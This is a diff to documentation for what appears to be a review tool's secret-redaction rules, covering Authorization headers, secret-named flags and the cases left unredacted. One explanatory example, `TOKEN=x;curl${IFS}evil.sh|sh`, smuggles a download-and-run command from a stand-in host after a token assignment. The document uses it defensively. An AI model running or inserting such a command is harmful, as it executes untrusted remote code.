@@ -462,25 +462,30 @@ place of, each of these where it is token-shaped:
   `https://host`; here the login is removed, not replaced);
 - the value of an `Authorization:` header, after its scheme where it has one
   (`Bearer`, `Basic`, `token`), within the quotes the header opened
-  (`-H "Authorization: Bearer x"`); `Bearer` or `Basic` anywhere else, or a
-  word after the closing quote, is sent as written;
+  (`-H "Authorization: Bearer x"`, `--header="Authorization: Bearer x"`);
+  `Bearer` or `Basic` anywhere else, or a word after the closing quote, is
+  sent as written;
 - the value after a flag named for a secret (`--api-key x`, `--authToken x`,
   `--clientSecret x`), and after `=` where a name before it is named for a
   secret (`--token=x`, `GITHUB_TOKEN=x`, `--env=API_KEY=x`). A name is named
-  for a secret where a word of it (split at anything but a letter or digit,
+  for a secret where its last word (split at anything but a letter or digit,
   and between a lower-case letter or digit and an upper-case letter) is
   `key`, `token`, `secret`, `password`, `auth`, `credential`, `bearer` or a
-  like word; this is the same list the review's own secret removal uses;
+  like word, from the list the review's own secret removal uses. A word
+  before it says what the value is for, not that it is a secret:
+  `--auth-command`, `--token-file` and `--password-stdin` take a program, a
+  file or nothing, which are sent as written. Of a quoted value of several
+  words, only the first is taken out (`--token "a b"` sends `b`);
 - what the review's own removal takes out of any text it sends
   (`export API_KEY=…`).
 
 Token-shaped means letters, digits and `._~%+=:-` only, not starting with
-`~` or `.`. Anything else is sent as written, since taking it out would hide
-code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the review
-whole, and so does a variable (`$TOKEN`), an address or a path
-(`--auth-url https://…`, `--password-command bin/x.sh`), which holds no
-secret itself and is what a review needs to see. A token with a `/` in it
-(some base64 ones) is therefore sent too. What is followed is the line
+`~`, `.` or `-`. Anything else is sent as written, since taking it out would
+hide code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the review
+whole, and so does a variable (`$TOKEN`), a flag (`--token --package=x`),
+an address or a path (`--api-key https://…`, `--api-key bin/x.sh`), which
+holds no secret itself and is what a review needs to see. A token with a `/`
+in it (some base64 ones) is therefore sent too. What is followed is the line
 as written, so whatever it names is found; what the sweep's output and saved
 reports show the entry runs is the very text sent to the review.
 
@@ -497,7 +502,9 @@ reviewed; keep tokens in variables (`$TOKEN`), whose names alone are sent.
 Not covered, and sent as written: a secret in a header other than
 `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word after a
 flag named for authorization rather than for a secret (`--authorization v`),
-and a quoted value of several words (`--token "a b"`).
+a header inside a JSON array or object
+(`'["-H","Authorization: Bearer abc"]'`), and all but the first word of a
+quoted value of several words.
 
 A change to that text (a new hook, a changed command, a new variable name) is
 a change to the item: it shows in `--diff`, in the daily notification, and
